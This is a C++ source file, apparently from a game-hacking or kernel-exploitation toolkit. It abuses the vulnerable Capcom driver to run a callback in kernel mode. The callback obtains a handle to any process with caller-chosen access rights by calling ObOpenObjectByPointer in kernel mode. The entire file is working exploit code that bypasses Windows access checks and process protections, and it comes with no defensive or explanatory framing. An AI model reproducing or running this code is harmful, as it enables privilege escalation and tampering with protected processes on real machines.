
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include "CapcomWrapper.h"
#include "OpenProcessAttack.h"

using namespace std;
 
 
BOOLEAN g_InitializationFinished = FALSE;
 
void GetSystemRoutines(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress) {

    PsLookupProcessByProcessId = (decltype(PsLookupProcessByProcessId))GetKernelRoutine(pMmGetSystemRoutineAddress, L"PsLookupProcessByProcessId");
    ObDereferenceObject = (decltype(ObDereferenceObject))GetKernelRoutine(pMmGetSystemRoutineAddress, L"ObDereferenceObject");
    PsProcessType = (decltype(PsProcessType))GetKernelRoutine(pMmGetSystemRoutineAddress, L"PsProcessType");
    ObOpenObjectByPointer = (decltype(ObOpenObjectByPointer))GetKernelRoutine(pMmGetSystemRoutineAddress, L"ObOpenObjectByPointer");
 
    g_InitializationFinished = TRUE;
}
 
void __stdcall CapcomOpenProcess(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, PVOID CustomData) {
    NTSTATUS status = 0;
    PEPROCESS process = NULL;
    HANDLE handle = NULL;
    OPENPROCESS_DATA* data = (OPENPROCESS_DATA*)CustomData;
 
    if(!g_InitializationFinished) {
        GetSystemRoutines(pMmGetSystemRoutineAddress);
    }
 
    __try {
        if(data->processId != NULL) {
            status = PsLookupProcessByProcessId(data->processId, &process);
        }
        if(status >= 0) {
            status = ObOpenObjectByPointer(
                process, 
                0, 
                NULL, 
                data->access,
                *PsProcessType,
                0/*KernelMode*/,
                &handle);
            if(status >= 0) {
                data->returnedHandle = handle;
            }
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
 
    }
    if (process != NULL) {
        ObDereferenceObject(process);
    }
}



HANDLE OpenProcessFromKernel(HANDLE processId, ACCESS_MASK access) {

    if (!InitDriver()) {
        return NULL;
    }

    OPENPROCESS_DATA data;
    data.processId = processId;
    data.access = access;
    data.returnedHandle = NULL;

    RunInKernel(CapcomOpenProcess, &data);

    return data.returnedHandle;
}
